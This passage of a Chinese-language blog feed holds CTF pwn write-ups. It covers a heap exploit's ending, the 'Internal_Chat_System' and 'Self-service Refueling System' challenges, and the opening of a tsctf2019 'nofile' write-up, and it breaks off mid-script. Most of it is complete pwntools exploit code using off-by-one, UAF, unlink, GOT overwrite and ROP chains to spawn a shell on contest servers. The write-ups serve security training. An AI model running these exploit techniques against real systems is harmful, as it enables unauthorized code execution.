class="number">0x68</span>,p64(libc_base+(libc.sym[<span class="string">'system'</span>]))*<span class="number">13</span>)<span class="comment">#0</span></span><br><span class="line">    Show()</span><br><span class="line">    p.recvuntil(<span class="string">"0 : "</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x61</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    fake_vtable = heap_base + <span class="number">0x20</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xf0</span></span><br><span class="line">    payload += <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x3c5520</span><span class="number">-0x10</span>)+p64(<span class="number">2</span>)+p64(<span class="number">3</span>)+<span class="string">"\x00"</span>*<span class="number">0xa8</span>+p64(fake_vtable)</span><br><span class="line">    Add(<span class="number">0x1e8</span>,payload)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">'Choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"size: "</span>)</span><br><span class="line">    p.sendline(str(<span class="number">17</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="Internal-Chat-System"><a href="#Internal-Chat-System" class="headerlink" title="Internal_Chat_System"></a>Internal_Chat_System</h2><h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>看这个register和login开始还以为是xctf final的原题，后来发现还是有点不同，UpdateProfile里有个off-by-one，AddDelete里有个UAF。泄露libc卡了我很久，最后Add自己为friend再删除自己，再View就可以将main_arena+88的内容作为name输出，泄露堆地址。  </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">UpdateProfile</span><span class="params">(<span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input your name:"</span>);</span><br><span class="line">  size = <span class="built_in">strlen</span>(*(<span class="keyword">const</span> <span class="keyword">char</span> **)qword_6030E0[idx]);</span><br><span class="line">  read(<span class="number">0</span>, *(<span class="keyword">void</span> **)qword_6030E0[idx], size);   <span class="comment">// off-by-one</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input your age:"</span>);</span><br><span class="line">  v2 = qword_6030E0[idx];</span><br><span class="line">  *(_QWORD *)(v2 + <span class="number">8</span>) = read_int();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Input your description:"</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="keyword">void</span> *)(v2 + <span class="number">16</span>), <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">AddDelete</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v4; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> ***ptr; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"So..Do u want to add or delete this friend?(a/d)"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">2u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="number">100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(<span class="keyword">const</span> <span class="keyword">char</span> ***)(qword_6030E0[a1] + <span class="number">280</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"What the fuck?"</span>);</span><br><span class="line">    <span class="keyword">while</span> ( v4 &amp;&amp; <span class="built_in">strcmp</span>(a2, *v4) )</span><br><span class="line">      v4 = (<span class="keyword">const</span> <span class="keyword">char</span> **)v4[<span class="number">35</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      ptr = *(<span class="keyword">const</span> <span class="keyword">char</span> ****)(qword_6030E0[a1] + <span class="number">280</span>);</span><br><span class="line">      <span class="keyword">if</span> ( ptr[<span class="number">35</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="built_in">strcmp</span>(*ptr[<span class="number">35</span>], a2) )</span><br><span class="line">          ptr = (<span class="keyword">const</span> <span class="keyword">char</span> ***)ptr[<span class="number">35</span>];</span><br><span class="line">        ptr[<span class="number">35</span>] = (<span class="keyword">const</span> <span class="keyword">char</span> **)v4[<span class="number">35</span>];</span><br><span class="line">        <span class="built_in">free</span>(v4);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(qword_6030E0[a1] + <span class="number">0x118</span>) = <span class="number">0L</span>L;</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You don't have such a friend!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v3 = CheckUser(a2);</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"No such user!"</span>);</span><br><span class="line">    v5 = *(_QWORD **)(qword_6030E0[a1] + <span class="number">280</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( v5[<span class="number">35</span>] )</span><br><span class="line">        v5 = (_QWORD *)v5[<span class="number">35</span>];</span><br><span class="line">      v5[<span class="number">35</span>] = qword_6030E0[v3];</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      *(_QWORD *)(qword_6030E0[a1] + <span class="number">280</span>) = qword_6030E0[v3];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Unlink之后在bss上构造node-&gt;heap(具体而言就是构造一个node，它的name_chunk是一个堆地址，且这个堆地址是一个未释放的node地址(0x130大小的块)，我们按照这个伪造的node信息登上去(username为一个堆地址(就是那个0x130块作为node用的name_chunk地址)))，之后Add一个Friend，就是这个0x130的块，也就是我们构造的假的结构体们如下：<br>fake_node:bss_addr-&gt;fake_usr_name_addr(some_node_addr)-&gt;some_node_addr’s user_name_addr。<br>一旦我们删除这个friend，即删除这个0x130的块，我们的fake_usr_name_addr的内容就是main_arena+88，View即可得到。  </p>
<p>getshell方法就很多了，我这里是改aoti@got到system，输入菜单的时候输入”/bin/sh\x00”即可。</p>
<h3 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'120.55.43.255'</span>,<span class="number">19812</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Register</span><span class="params">(size,name,age=<span class="number">18</span>,des=<span class="string">"1"</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your name size:"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Input your name:"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your age:"</span>,str(age))</span><br><span class="line">    p.sendafter(<span class="string">"Input your description:"</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Login</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Please input your user name:"</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Input the friend's name:"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"So..Do u want to add or delete this friend?(a/d)"</span>,<span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"3"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Input the friend's name:"</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"So..Do u want to add or delete this friend?(a/d)"</span>,<span class="string">"d\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ViewProfile</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ViewMsg</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(name,age=<span class="number">19</span>,des=<span class="string">"123"</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Input your name:"</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your age:"</span>,str(age))</span><br><span class="line">    p.sendafter(<span class="string">"Input your description:"</span>,des)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SendMsg</span><span class="params">(name,title=<span class="string">"123"</span>,content=<span class="string">"456"</span>)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"4"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Which user do you want to send a msg to:"</span>,name)</span><br><span class="line">    p.sendafter(<span class="string">"Input your message title:"</span>,title)</span><br><span class="line">    p.sendafter(<span class="string">"Input your content:"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"6"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"0"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"1"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"2"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"3"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"4"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)<span class="comment">#target</span></span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"5"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"6"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"7"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)<span class="comment">#target</span></span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"8"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"9"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"A"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"B"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Register(<span class="number">0x68</span>,<span class="string">"C"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Login(<span class="string">"A"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Add(<span class="string">"A"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="string">"A"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    ViewProfile()</span><br><span class="line">    <span class="comment">#leak heap</span></span><br><span class="line">    p.recvuntil(<span class="string">"Username:"</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x2d50</span></span><br><span class="line">    log.success(<span class="string">"heap base =&gt; "</span> + hex(heap_base))</span><br><span class="line">    Logout()</span><br><span class="line">    Register(<span class="number">0x128</span>,p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#unlink 7</span></span><br><span class="line">    Login(<span class="string">"0"</span>*<span class="number">0x67</span>+<span class="string">'\x00'</span>)</span><br><span class="line">    Add(<span class="string">"6"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Add(<span class="string">"7"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Add(<span class="string">"8"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="string">"7"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Logout()</span><br><span class="line">    <span class="comment">#off-by-one</span></span><br><span class="line">    chunk_lis = <span class="number">0x6030e0</span></span><br><span class="line">    fd = chunk_lis + <span class="number">8</span>*<span class="number">7</span> - <span class="number">0x18</span></span><br><span class="line">    bk = chunk_lis + <span class="number">8</span>*<span class="number">7</span> - <span class="number">0x10</span></span><br><span class="line">    payload = p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span class="line">    Register(<span class="number">0xc0</span>,payload)<span class="comment">#ini 1</span></span><br><span class="line">    Register(<span class="number">0x38</span>,<span class="string">"a"</span>*<span class="number">0x38</span>)<span class="comment">#ini 1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Login(<span class="string">"a"</span>*<span class="number">0x38</span>+p64(<span class="number">0x131</span>))</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0x30</span>+p64(<span class="number">0x120</span>)+<span class="string">"\x30"</span></span><br><span class="line"></span><br><span class="line">    Update(payload)</span><br><span class="line"></span><br><span class="line">    Logout()</span><br><span class="line">    <span class="comment">#first</span></span><br><span class="line">    Login(<span class="string">"0"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Delete(<span class="string">"8"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    Add(<span class="string">"3"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Add(<span class="string">"4"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Add(<span class="string">"5"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="string">"4"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    Logout()</span><br><span class="line">    <span class="comment">#off-by-one</span></span><br><span class="line">    payload = p64(elf.got[<span class="string">'puts'</span>])+p64(<span class="number">0x21</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    Register(<span class="number">0x240</span>,p64(elf.bss()),<span class="number">0x603110</span>,p64(heap_base+<span class="number">0xe50</span>))</span><br><span class="line">    Register(<span class="number">0x100</span>,p64(elf.bss()),<span class="number">0x603110</span>,p64(heap_base+<span class="number">0xe50</span>)+p64(<span class="number">0x603100</span><span class="number">-8</span>))</span><br><span class="line">    Register(<span class="number">0x40</span>,p64(elf.bss()),<span class="number">0x603110</span>,p64(heap_base+<span class="number">0xe50</span>)*<span class="number">2</span>+p64(<span class="number">0x603100</span><span class="number">-0x10</span>))</span><br><span class="line"></span><br><span class="line">    Login(p64(heap_base+<span class="number">0x2cd0</span>))</span><br><span class="line">    Add(<span class="string">"C"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Delete(<span class="string">"C"</span>*<span class="number">0x67</span>+<span class="string">"\x00"</span>)</span><br><span class="line">    ViewProfile()</span><br><span class="line">    p.recvuntil(<span class="string">"Username:"</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x10</span> - libc.sym[<span class="string">"__malloc_hook"</span>] - <span class="number">88</span></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    free_hook = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line">    Logout()</span><br><span class="line">    free_hook = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    Register(<span class="number">0x68</span>,p64(elf.bss()),<span class="number">0x603110</span>,p64(free_hook)*<span class="number">3</span>+p64(<span class="number">0x603100</span><span class="number">-0x18</span>))</span><br><span class="line">    Register(<span class="number">0x68</span>,p64(elf.bss()),<span class="number">0x603100</span>,p64(free_hook)*<span class="number">3</span>+p64(<span class="number">0x603100</span><span class="number">-0x18</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Login(p64(libc.sym[<span class="string">'atoi'</span>]))</span><br><span class="line">    <span class="comment">#gdb.attach(p,"b* 0x400d42")</span></span><br><span class="line">    <span class="comment">#Update(p64(libc.sym["system"]),elf.bss(),p64(0x603110))</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice:"</span>,<span class="string">"2"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Input your name:"</span>,p64(libc.sym[<span class="string">"system"</span>]))</span><br><span class="line">    p.sendlineafter(<span class="string">"Input your age:"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Input your description:"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    p.sendafter(<span class="string">"Your choice:"</span>,<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#Login("0"*0x67+"\x00")</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#SendMsg("3"*0x67+"\x00","a"*0x888,"a")</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h2 id="Self-service-Refueling-System"><a href="#Self-service-Refueling-System" class="headerlink" title="Self-service Refueling System"></a>Self-service Refueling System</h2><h3 id="exp-py-2"><a href="#exp-py-2" class="headerlink" title="exp.py"></a>exp.py</h3><p>这个题基本没什么好说的，普通栈溢出，先leak libc之后get shell。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'120.55.43.255'</span>,<span class="number">23810</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p_rdi = <span class="number">0x0000000000400fb3</span></span><br><span class="line">main_addr = <span class="number">0x400eaa</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    payload = <span class="string">"a"</span>*(<span class="number">0x20</span><span class="number">-0x8</span>) + p32(<span class="number">0x6666</span>) + p32(<span class="number">0x2333</span>)</span><br><span class="line">    payload += <span class="string">"b"</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(p_rdi)+p64(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">    payload += p64(elf.plt[<span class="string">'puts'</span>])+p64(main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">"Do you want to refuel?(y/n)"</span>)</span><br><span class="line">    p.sendline(<span class="string">"y"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Plz input your Gas Card ID :"</span>)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    libc_base = u64(p.recvuntil(<span class="string">"\x7f\n"</span>,drop=<span class="literal">False</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + libc.search(<span class="string">"/bin/sh\x00"</span>).next()</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    payload = <span class="string">"a"</span>*(<span class="number">0x20</span><span class="number">-0x8</span>) + p32(<span class="number">0x6666</span>) + p32(<span class="number">0x2333</span>)</span><br><span class="line">    payload += <span class="string">"b"</span>*<span class="number">0x8</span></span><br><span class="line">    payload += p64(p_rdi)+p64(binsh_addr)</span><br><span class="line">    payload += p64(system_addr)+p64(main_addr)</span><br><span class="line">    p.recvuntil(<span class="string">"Do you want to refuel?(y/n)"</span>)</span><br><span class="line">    p.sendline(<span class="string">"y"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Plz input your Gas Card ID :"</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,'b* 0x400f43')</span></span><br><span class="line">    raw_input()</span><br><span class="line">    p.send(payload)</span><br><span class="line">    raw_input()</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF writeup</category>
      </categories>
  </entry>
  <entry>
    <title>nofile</title>
    <url>/2020/09/03/nofile/</url>
    <content><![CDATA[<h1 id="tsctf2019-gt-nofile"><a href="#tsctf2019-gt-nofile" class="headerlink" title="tsctf2019 -&gt; nofile"></a>tsctf2019 -&gt; nofile</h1><h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序中main函数里首先执行Init，Init()使用setrlimit()限制了文件的描述符，导致无法打开文件分配文件描述符。程序提供了vulnfunc读取flag。</p>
<p>在main函数里，可以读取5个字节整数长度的数据，这里有栈溢出。之后可以重新构造数据，二次溢出</p>
<p><img src="/2020/09/03/nofile/1.jpg" alt="main"></p>
<p><img src="/2020/09/03/nofile/2.jpg" alt="init"></p>
<p><img src="/2020/09/03/nofile/3.jpg" alt="vulnfunc"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序开了地址随机化和canary，要先泄露程序加载基地址和canary。观察一下发现rbp-8(canary)后面可泄露程序加载基址，可以构造’a’*0x18+’\n’，还原canary并得到程序加载基址。</p>
<p>之后拿csu的gadgets依次执行getrlimit(RLIMIT_NOFILE,bss_addr),read(0,bss_addr,100)输入构造的假的rlimit结构体，其rlimits.rlim_cur为1024。</p>
<p>read(0,bss_addr+0x30,100)读取”flag”,setrlimit(RLIMIT_NOFILE, bss_addr)设置fd软限制为1024</p>
<p>最后用pop_rdi_ret把bss+0x30作为参数传给vuln，调用这个函数即可读取flag</p>
<p><img src="/2020/09/03/nofile/4.jpg" alt="stack"></p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./nofile'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./nofile'</span>)</span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./nofile'</span>)</span><br><span class="line">    gdb.attach(p,<span class="string">'b *0x555555554dda'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'10.112.100.47'</span>,<span class="number">6135</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(base,rbx, rbp, r12, r13, r14, r15, last)</span>:</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call</span></span><br><span class="line">    <span class="comment"># rdi=edi=r15d</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span 